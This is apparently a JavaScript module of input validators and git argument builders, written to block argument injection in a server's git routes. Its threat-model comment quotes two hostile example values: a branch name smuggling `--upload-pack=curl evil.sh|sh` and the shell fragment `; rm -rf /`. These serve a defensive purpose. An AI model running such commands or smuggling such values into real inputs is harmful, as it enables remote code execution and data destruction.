/**
 * Validation helpers and argument builders for the `git` subprocess calls made
 * by server/routes/git.js.
 *
 * Why this is a separate module: every function here encodes a security
 * decision, and security decisions that live inline inside a 1600-line express
 * router cannot be unit tested. Extracting them makes the two properties that
 * matter — "user input can never be read by git as an option" and "the
 * separator placement is correct for this particular subcommand" — assertable
 * in server/routes/tests/git-args.test.js.
 *
 * Threat model: spawn() runs with `shell: false`, so there is no
 * shell-injection surface — a value containing `; rm -rf /` is passed to git as
 * one inert argv entry. The real risk is *argument* injection: a branch
 * literally named `--upload-pack=curl evil.sh|sh`, or a remote named `-D`, is a
 * legal value for these request fields but would be parsed by git as an option
 * rather than an operand. Two layers defend against it:
 *
 *   1. Every validator rejects a leading `-`, so an option-shaped value never
 *      reaches git in the first place.
 *   2. Builders place `--` before user-supplied operands, so even if layer 1
 *      were bypassed git would treat what follows as data.
 *
 * Layer 2 is deliberately NOT applied uniformly. `--` means "end of options"
 * for most commands, but for `git checkout` it also selects the *path*
 * interpretation of the operand: `git checkout -- feature` restores a file
 * named `feature` from the index and does not switch branches at all. Each
 * builder below therefore documents its own separator choice, and the
 * integration tests run the produced argv against a real repository to prove
 * the command still does what the route intends.
 */
import path from 'node:path';

/**
 * Rejects option-shaped values. This is the primary defense: git parses any
 * argument beginning with `-` as an option wherever options are still accepted.
 *
 * @param {string} value the already-character-validated input
 * @param {string} label used in the error message
 * @returns {string} value, unchanged, when it is safe
 */
export function rejectLeadingDash(value, label) {
  if (value.startsWith('-')) {
    throw new Error(`Invalid ${label}: must not start with "-"`);
  }
  return value;
}

/**
 * Accepts hex hashes, HEAD, HEAD~N, HEAD^N, tag names and branch names.
 */
export function validateCommitRef(commit) {
  if (!/^[a-zA-Z0-9._~^{}@/-]+$/.test(commit)) {
    throw new Error('Invalid commit reference');
  }
  return rejectLeadingDash(commit, 'commit reference');
}

export function validateBranchName(branch) {
  if (!/^[a-zA-Z0-9._/-]+$/.test(branch)) {
    throw new Error('Invalid branch name');
  }
  return rejectLeadingDash(branch, 'branch name');
}

export function validateRemoteName(remote) {
  if (!/^[a-zA-Z0-9._-]+$/.test(remote)) {
    throw new Error('Invalid remote name');
  }
  return rejectLeadingDash(remote, 'remote name');
}

/**
 * Guards against path traversal by resolving `file` against the project root
 * and requiring the result to stay inside it. Callers that only have a path
 * fragment (no root yet) may omit `projectPath`, which checks the NUL byte
 * only.
 */
export function validateFilePath(file, projectPath) {
  if (!file || file.includes('\0')) {
    throw new Error('Invalid file path');
  }
  if (projectPath) {
    const resolved = path.resolve(projectPath, file);
    const normalizedRoot = path.resolve(projectPath) + path.sep;
    if (!resolved.startsWith(normalizedRoot) && resolved !== path.resolve(projectPath)) {
      throw new Error('Invalid file path: path traversal detected');
    }
  }
  return file;
}

export function validateProjectPath(projectPath) {
  if (!projectPath || projectPath.includes('\0')) {
    throw new Error('Invalid project path');
  }
  const resolved = path.resolve(projectPath);
  if (!path.isAbsolute(resolved)) {
    throw new Error('Invalid project path: must be absolute');
  }
  if (resolved === '/' || resolved === path.sep) {
    throw new Error('Invalid project path: root directory not allowed');
  }
  return resolved;
}

/* -------------------------------------------------------------------------
 * Argument builders
 *
 * Each returns the exact argv passed to spawn('git', argv). They validate
 * first so a bad value throws before any process is created.
 * ---------------------------------------------------------------------- */

/**
 * Switch to an existing branch.
 *
 * NO `--` separator, unlike every other builder here. `git checkout -- <name>`
 * means "restore the path <name> from the index"; adding the separator makes
 * the command silently stop switching branches and fail with "pathspec did not
 * match any file(s)". The leading-dash rejection in validateBranchName is the
 * only guard this call site gets, which is why that check is not optional.
 */
export function checkoutBranchArgs(branch) {
  return ['checkout', validateBranchName(branch)];
}

/**
 * Create and switch to a new branch.
 *
 * The trailing `--` is safe (and useful) here because `-b` already fixes the
 * operand's meaning as a branch name; the separator only terminates option
 * parsing, and the empty pathspec list that follows is accepted.
 */
export function createBranchArgs(branch) {
  return ['checkout', '-b', validateBranchName(branch), '--'];
}

/**
 * Delete a local branch. `git branch` takes no pathspecs, so a leading `--`
 * unambiguously marks the branch name as an operand.
 */
export function deleteBranchArgs(branch) {
  return ['branch', '-d', '--', validateBranchName(branch)];
}

/**
 * Show a commit with its diff. The trailing `--` separates the revision from
 * the (empty) pathspec list, so a ref that looks like a path cannot be
 * reinterpreted.
 */
export function showCommitArgs(commit) {
  return ['show', validateCommitRef(commit), '--'];
}

export function fetchArgs(remote) {
  return ['fetch', '--', validateRemoteName(remote)];
}

export function pullArgs(remote, branch) {
  return ['pull', '--', validateRemoteName(remote), validateBranchName(branch)];
}

export function pushArgs(remote, branch) {
  return ['push', '--', validateRemoteName(remote), validateBranchName(branch)];
}

export function pushSetUpstreamArgs(remote, branch) {
  return [
    'push',
    '--set-upstream',
    '--',
    validateRemoteName(remote),
    validateBranchName(branch),
  ];
}
